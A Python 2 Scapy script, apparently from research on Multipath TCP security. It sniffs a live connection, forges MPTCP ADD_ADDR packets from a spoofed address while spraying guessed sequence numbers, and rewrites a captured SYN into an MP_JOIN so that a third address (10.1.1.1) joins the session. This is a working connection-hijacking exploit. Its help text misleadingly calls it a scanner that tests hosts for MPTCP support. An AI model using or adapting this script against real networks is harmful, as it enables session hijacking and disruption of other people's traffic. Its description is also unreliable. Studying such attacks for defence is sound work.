import logging
import threading
import sys
logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)

from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
import random
from scapy.all import *
from netaddr import *
import netaddr


class SYNThread (threading.Thread):
    def __init__(self, threadID, name, counter, serverIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.serverIP = serverIP
    def run(self):
        sniff_SYN(self.serverIP)


class SYNACKThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        sniff_SYNACK()





def get_local_ip_address(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((str(target), 8000))
    ipaddr = s.getsockname()[0]
    s.close()
    return ipaddr


def makeMPJoin(input, ipdb):
    pkt = (IP(version=4L,src=input[IP].src,dst=input[TCP].dst)/        \
        TCP(sport=input[TCP].sport,dport=input[TCP].dport,flags="S",\
        seq=input[TCP].seq,ack=input[TCP].ack, \
        dataofs=input[TCP].dataofs, reserved=input[TCP].reserved, \
        window=input[TCP].window, chksum=input[TCP].chksum, \
        urgptr=input[TCP].urgptr, \
        options=[TCPOption_MP(mptcp=MPTCP_AddAddr(
                            address_id=5,
                            adv_addr="10.1.1.1"))]))
    #print pkt.show()
    return pkt


def makeMPAddAddr(sourceAddr, sport, dstAddr, dport, initTCPSeq, initTCPAck):
    pkt = (IP(version=4L,src=sourceAddr,dst=dstAddr)/        \
        TCP(sport=sport,dport=dport,flags="A",seq=initTCPSeq,ack=initTCPAck, \
        options=[TCPOption_MP(mptcp=MPTCP_AddAddr(
                            address_id=5,
                            adv_addr="10.1.1.1"))]))
    #print pkt.show()
    return pkt


def defaultSend(srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck, tap):
    pkt = makeMPAddAddr(srcIP, srcPort, dstIP, dstPort, \
                   sniffedSeq, sniffedAck)
    # print "\n\n\n SENDING "
    # pkt.show()
    # print "END \n\n\n"
    sr1(pkt,timeout=4,iface=tap)
    return

def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Network scanner to test hosts for multipath TCP support. Requires root privileges for scapy.')
    parser.add_argument('serverIP', action='store', help='Source IP address')
    parser.add_argument('clientIP', action='store', help='Destination IP address')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    return args


def sniff_start_synack(p):
    if p.haslayer(TCP):
        str = p.sprintf("%TCP.flags%")
        if "SA" in str:
            return True
    return False


def sniff_SYNACK():
    print "\nStart looking for SYNACK"
    conf.iface='tap0'
    synlist = sniff(iface='tap0', lfilter=lambda p: sniff_start_synack(p), timeout=6, count=1)
    if len(synlist) == 0:
        print "SORRY, no SYNACK received from server"
        sys.exit(1)
    pkt = synlist[len(synlist)-1]
    print "PHASE 2 COMPLETED!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    return
    # pkt.show()


def modify_addr_id(pkt, aid):
    rcv = 0x00000000
    snd = 0x00000000
    bkp = 0L
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "MP_JOIN":
                    rcv = o.rcv_token
                    snd = o.snd_nonce
                    bkp = o.backup_flow
    modified_options = []
    for opt in pkt[TCP].options:
        if opt.kind != 30:
            modified_options.append(opt)
    modified_options.append(TCPOption_MP(mptcp=MPTCP_JoinSYN(
                        addr_id=aid,
                        backup_flow=bkp,
                        rcv_token=rcv,
                        snd_nonce=snd)))
    pkt[TCP].options = modified_options
    return pkt

def sniff_start_syn(p):
    if p.haslayer(TCP):
        str = p.sprintf("%TCP.flags%")
        if "S" in str:
            return True
    return False


def sniff_SYN(serverIP):
    print "Start looking for SYN"
    conf.iface='tap0'
    synlist = sniff(iface='tap0', lfilter=lambda p: sniff_start_syn(p), timeout=6, count=1)
    if len(synlist) == 0:
        print "SORRY, no SYN received from client"
        return
    pkt = synlist[len(synlist)-1]
    #pkt.show()
    pkt[IP].dst = serverIP
    pkt[IP].src = "10.1.1.1"
    pkt[TCP].sport += 12
    time.sleep(1)
    pkts = modify_addr_id(pkt,5)
    pkts.show()
    sendp(pkts,iface="tap2")
    print "Phase 1 completed"


def sniff_start_lambda(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        v1 = int(p.sprintf("%TCP.ack%"))
        v2 = int(p.sprintf("%TCP.seq%"))
        if str == srcIP and v1 > 0 and v2 > 0:
            return True
    return False

def main():
    args = parse_args()

    thread1 = SYNThread(1, "Syn capturing thread", 1, args.serverIP)
    thread1.start()
    # thread2 = SYNACKThread(1, "SynAck capturing thread", 1)
    # thread2.start()
    time.sleep(0.01) #WAIT FOR THE THREAD TO START BEFORE ISSUING THE ADD_ADDR PACKET!!!!!!!
    #conf.iface='tap2'
    #p2 = sniff(iface='tap2', lfilter=lambda p: sniff_start_lambda(p, args.clientIP), timeout=2, count=1)
    conf.iface='tap0'
    p = sniff(iface='tap0', lfilter=lambda p: sniff_start_lambda(p, args.clientIP), count=1)
    #time.sleep(0.1) #NECESSARY FOR SYNCHRONIZATION PURPOSES
    st = threading.Thread(target=defaultSend(args.clientIP, p[0][TCP].sport, args.serverIP, p[0][TCP].dport, (p[0][TCP].seq), (p[0][TCP].ack)-10000*1427, "tap2"))
    st.start()
    threads = []
    i = -(1427*10)
    while i < (1427*1000):
        #print i
        threads.append(threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)-i, "tap0")))
        i += 142700
    print "" + str(len(threads)) + " ADD_ADDR packets ready to start"
    for t in threads:
        t.start()
    #
    # t1 = threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)-10000*1427, "tap0"))
    # t1.start()
    # t2 = threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)-100*1427, "tap0"))
    # t2.start()
    # t3 = threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)-1000*1427, "tap0"))
    # t3.start()
    # t4 = threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)+10000*1427, "tap0"))
    # t4.start()
    # t5 = threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)+1000*1427, "tap0"))
    # t5.start()
    # t6 = threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)+100*1427, "tap0"))
    # t6.start()
    # defaultSend(args.clientIP, p[0][TCP].sport, args.serverIP, p[0][TCP].dport, (p[0][TCP].seq), (p[0][TCP].ack)-10000*1427, "tap2")
    # defaultSend(args.clientIP, p[0][TCP].sport, args.serverIP, p[0][TCP].dport, (p[0][TCP].seq), (p[0][TCP].ack)-1000*1427, "tap2")
    # defaultSend(args.clientIP, p[0][TCP].sport, args.serverIP, p[0][TCP].dport, (p[0][TCP].seq), (p[0][TCP].ack)-100*1427, "tap2")

    thread1.join()
    # thread2.join()
    return

if __name__ == "__main__":
    main()
